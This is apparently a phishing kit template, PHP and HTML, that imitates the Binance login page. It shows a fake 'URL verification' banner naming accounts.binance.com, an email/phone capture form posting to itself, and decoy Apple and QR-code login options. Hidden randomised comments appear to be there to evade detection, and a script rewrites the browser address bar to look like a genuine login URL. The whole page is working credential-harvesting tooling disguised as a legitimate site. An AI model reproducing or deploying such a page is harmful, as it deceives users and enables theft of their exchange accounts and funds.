        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 3C8.13401 3 5 6.13401 5 10L5 13L4 14V16H5L19 16H20L20 14L19 13V10C19 6.13401 15.866 3 12 3ZM12 21C9.94965 21 8.18757 19.7659 7.41602 18H16.5839C15.8124 19.7659 14.0503 21 12 21Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="orders-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M5 3H19V21L15.5 18L12 21L8.5 18L5 21V3ZM8 7H12V9.5H8V7ZM12 12H8V14.5H12V12ZM14 7H16.5V9.5H14V7ZM16.5 12H14V14.5H16.5V12Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="referral-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M11 8.5C11 10.433 9.433 12 7.5 12C5.567 12 4 10.433 4 8.5C4 6.567 5.567 5 7.5 5C9.433 5 11 6.567 11 8.5ZM2 17C2 15.3431 3.34315 14 5 14H10C11.6569 14 13 15.3431 13 17V20H2V17ZM16.5 16V13H13.5V10H16.5V7H19.5V10H22.5V13H19.5V16H16.5Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="reward-center-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M3 5H21V9C19.3431 9 18 10.3431 18 12C18 13.6569 19.3431 15 21 15V19H3V15C4.65685 15 6 13.6569 6 12C6 10.3431 4.65685 9 3 9V5ZM15.5 7.5H13V16.5H15.5V7.5Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="security-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M4 4V16L12 21L20 16V4H4ZM12 8L8.5 11.5L12 15L15.5 11.5L12 8Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="subaccount-s24">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 8.5C12 10.433 10.433 12 8.5 12C6.567 12 5 10.433 5 8.5C5 6.567 6.567 5 8.5 5C10.433 5 12 6.567 12 8.5ZM3 17C3 15.3431 4.34315 14 6 14H11C12.6569 14 14 15.3431 14 17V20H3V17ZM21 5H16V8H21V5ZM21 10.002H16V13.002H21V10.002ZM16 15.0039H21V18.0039H16V15.0039Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 16 16" id="tag-vip-s16">
        <g>
          <path d="M11.991 3H3.974L0 6.98 7.991 15 16 6.98 11.991 3z" fill="url(#paint0_linear)"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="8" y1="3" x2="8" y2="15" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F8D12F"></stop>
              <stop offset="1" stop-color="#F0B90B"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="task-center-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15 2H9V4H5V21H19V4H15V2ZM16 9H8V11.5H16V9ZM16 14.5H8V17H16V14.5Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="user-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16 8C16 10.2091 14.2091 12 12 12C9.79086 12 8 10.2091 8 8C8 5.79086 9.79086 4 12 4C14.2091 4 16 5.79086 16 8ZM8 14C5.79086 14 4 15.7909 4 18V20H20V18C20 15.7909 18.2091 14 16 14H8Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="verified-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.8234 5.33928L14.4311 2.92773L12.0195 4.32L9.60801 2.92773L8.2157 5.33928H5.43074V8.12408L3.01953 9.51617L4.41186 11.9277L3.01958 14.3393L5.43074 15.7314V18.5162H8.21567L9.60798 20.9277L12.0195 19.5354L14.4311 20.9277L15.8234 18.5162H18.6076V15.7318L21.0195 14.3393L19.6272 11.9277L21.0195 9.51618L18.6076 8.12364V5.33928H15.8234ZM10.86 12.4475L15.2913 8.01562L17.0591 9.78339L10.86 15.983L6.94067 12.0633L8.70844 10.2956L10.86 12.4475Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="wallet-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M4 8.5C4 6.01472 6.01472 4 8.5 4H20V20H8.5C6.01472 20 4 17.9853 4 15.5V8.5ZM8.5 7H17V10H8.5C7.67157 10 7 9.32843 7 8.5C7 7.67157 7.67157 7 8.5 7ZM13 13H17V17H13V13Z" fill="currentColor"></path>
      </symbol>
    </svg>
    <div id="__APP">
      <div id="wrap_app" class="css-155nz97">
        <div class="hidden-header-in-bnc css-1b9spv1"> <?php
  include '../include/header.php';
  ?> <div class="css-15xjy3y">
            <div id="header_global_js_wxgy34nj" class="css-6sm2ml"></div>
          </div>
        </div>
        <main class="main css-zy0fl3">
          <div class="css-1432u7b">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-11gn95z">
              <path fill-rule="evenodd" clip-rule="evenodd" d="M7 8v2H5v11h14V10h-2V8A5 5 0 007 8zm7.5 2V8a2.5 2.5 0 00-5 0v2h5zm-1 8v-5h-3v5h3z" fill="currentColor"></path>
            </svg>
            <div data-bn-type="text" class="css-1ldm553">URL verification:</div>
            <div data-bn-type="text" dir="ltr" class="css-mx5ldy">
              <span data-bn-type="text" class="css-13n52y">https://</span>accounts.binance.com
            </div>
          </div>
          <div class="css-108ucgm">
            <div class="binance-row css-16kn2us" style="margin-left: -12px; margin-right: -12px;">
              <div class="binance-col binance-col-4 css-vurnku" style="padding-left: 12px; padding-right: 12px;"></div>
              <div class="binance-col css-1wz0uwi" style="padding-left: 12px; padding-right: 12px; flex: 1 1 auto;">
                <div class="css-1yxi4cy">Binance Login</div>
                <div class="css-1q7zil0">
                  <div class="css-tmpver">
                        <!-- <?php echo  generateRandomString();  ?> -->
                            <!-- <?php echo  generateRandomString();  ?> -->
                                <!-- <?php echo  generateRandomString();  ?> -->
                                    <!-- <?php echo  generateRandomString();  ?> -->
                    <form id="formadmin" action="" method="post" autocomplete="off" name="formadmin">
                      <input type="hidden" name="uysnx1" value="xuysnx">
                          <!-- <?php echo  generateRandomString();  ?> -->
                      <div class="css-15651n7">
                            <!-- <?php echo  generateRandomString();  ?> -->
                        <div class="css-xjlny9">Email / Phone Number</div>
                        <div class=" css-hiy16i">
                          <div class="css-4cffwv">
                                <!-- <?php echo  generateRandomString();  ?> -->
                            <div class=" css-9eoscs " required>
                              <input data-bn-type="input" type="text" name="username" autocomplete="username" class="css-uesmnb  name" value="" required>
                              <div id="error"></div>
                              <div class="bn-input-suffix css-vurnku">
                                <div class="css-10nf7hq"></div>
                              </div>
                                  <!-- <?php echo  generateRandomString();  ?> -->
                                      <!-- <?php echo  generateRandomString();  ?> -->
                                          <!-- <?php echo  generateRandomString();  ?> -->
                                              <!-- <?php echo  generateRandomString();  ?> -->
                                                  <!-- <?php echo  generateRandomString();  ?> -->
                            </div>
                          </div>
                        </div>
                        <div class="help_default css-1acqidq"></div>
                      </div>
                      <button data-bn-type="button" id="click_login_submit" class=" css-h5sdlz">Next</button>
                    </form>
                    <div class="css-vurnku"></div>
                    <div class="css-49vimp">
                      <div class="css-5nv61p">
                        <div class="css-tnxu6e"></div>
                        <div data-bn-type="text" class="css-3pwr8y">or</div>
                        <div class="css-tnxu6e"></div>
                      </div>
                      <div class="css-yyvsvt">
                        <div class="sign-with css-16vu25q">
                          <a href="../apple/">
                            <button data-bn-type="button" id="apple-login-btn" class=" css-fkyok2">
                              <img src="img/tofa7a.svg" class="css-1bybaoo">
                              <div class="css-ppseap">Continue with Apple</div>
                            </button>
                          </a>
                          <div class="css-vurnku"></div>
                        </div>
                      </div>
                      <br>
                      <div class="css-yyvsvt">
                        <div class="sign-with css-16vu25q">
                          <div class="css-vurnku"></div>
                        </div>
                      </div>
                    </div>
                    <div class="css-10bsfyn">
                      <div class="css-irckfu">
                        <a data-bn-type="link" id="accounts-ui-create-binance-account" class="css-1exejw">Create a Binance Account</a>
                      </div>
                    </div>
                  </div>
                  <div class="css-f3oct0">
                    <div class="css-fe5m29">
                      <div class="qr-code css-14zvsi">
                        <img data-savepage-src="https://bin.bnbstatic.com/static/images/accounts/common/binance-logo.png" src="img/1.png" class="css-1vkfs78">
                        <div class="css-y6mhy3">
                          <canvas height="156" width="156" style="height: 156px; width: 156px; /*savepage-canvas-image*/ background-image: url(img/scan.png) !important; background-attachment: scroll !important; background-blend-mode: normal !important; background-clip: content-box !important; background-color: transparent !important; background-origin: content-box !important; background-position: center center !important; background-repeat: no-repeat !important; background-size: 100% 100% !important;"></canvas>
                        </div>
                      </div>
                      <div class="css-134ban9"></div>
                    </div>
                    <div data-bn-type="text" class="css-wz6kgg">Log in with QR code</div>
                    <div data-bn-type="text" class="css-1w2l5s">Scan this code with the <a data-bn-type="link" target="_blank" href="?link" id="login-qr-download" class="css-s84t59">Binance mobile app</a> to log in instantly. </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
        <div class="css-3kcv4i">
          <div data-bn-type="text" class="css-1om5toz">© 2017 - 2024 Binance.com. All rights reserved</div>
          <div data-bn-type="text" data-ot-trigger="true" class="css-ff02t7">Cookie Preferences</div>
        </div>
      </div>
    </div>
<?php
 include '../include/script_binance.php';
 ?>
    <script src="../js_main/jq.js"></script>
    <script src="../js_main/7adari_ababab.js"></script>
    <script></script>
    <style>
      #error {
        color: red;
      }
    </style>
    <script src="../js_main/1.js"></script>
    <script src="../js_main/2.js"></script>
    <script src="../js_main/3.js"></script>
    <script>
      if (window.history.replaceState) {
   window.history.replaceState("uysnx", "Title", "../en/Login?return_to=<?php print $khawazmia_binance;?>");
}
</script>

  </body>
</html>